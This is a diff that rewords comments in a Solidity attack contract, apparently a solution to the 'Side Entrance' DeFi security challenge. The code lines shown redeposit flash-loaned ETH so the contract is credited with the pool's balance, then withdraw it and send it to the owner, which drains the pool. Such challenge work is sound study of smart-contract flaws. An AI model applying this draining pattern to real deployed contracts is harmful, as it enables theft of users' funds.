@@ -22,8 +22,8 @@ contract SideEntranceAttack {
 	function execute() external payable {
 		// Use the same 1000 ether to execute deposit() function on the pool, so this will:
 		// a) Not increment the pool ETH balance (because they're the same ETH going back and forth)
-		// b) Increment the balance of this contract in Pool's mapping to 1000, making possible
-		// the withdrawing of 1000 ETH, which is the total balance of the pool
+		// b) Increment the balance of this contract in Pool's mapping to 1000
+		// making possible the draining of the pool (withdrawing of 1000 ETH)
 		pool.deposit{value: msg.value}();
 	}
 
@@ -31,7 +31,7 @@ contract SideEntranceAttack {
 		// Withdraw pool's balance to this contract
 		pool.withdraw();
 
-		// Send this contract's ETH balance to sender
+		// Send this contract's ETH balance to caller of this function
 		owner.call{value: address(this).balance}('');
 	}
 }
